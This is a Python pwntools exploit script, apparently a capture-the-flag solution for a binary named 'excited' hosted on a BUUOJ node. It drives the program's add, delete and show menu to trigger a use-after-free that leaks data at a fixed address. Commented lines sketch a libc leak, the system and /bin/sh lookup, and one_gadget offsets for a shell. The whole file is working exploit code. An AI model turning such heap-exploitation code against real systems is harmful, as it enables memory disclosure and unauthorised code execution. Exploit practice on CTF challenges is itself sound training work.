import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./excited')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./excited')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',28804)
			elf=ELF('./excited')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b,c,d):
			io.sendlineafter('t to do :','1')
			io.sendlineafter(' : ',str(a))
			io.sendafter(' : ',b)
			io.sendlineafter(' : ',str(c))
			io.sendafter(' : ',d)

		def delete(a):
			io.sendlineafter('t to do :','3')
			io.sendlineafter(' : ',str(a))

		def show(a):
			io.sendlineafter('t to do :','4')
			io.sendlineafter(' : ',str(a))
		

		add(0x20,'aaa',0x20,'aaaa')
		add(0x20,'aaa',0x20,'aaaa')
		delete(1)
		delete(0)
		add(0x10,p64(0x6020A8),0x10,p64(0x6020A8))
		show(1)
		io.recv()
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue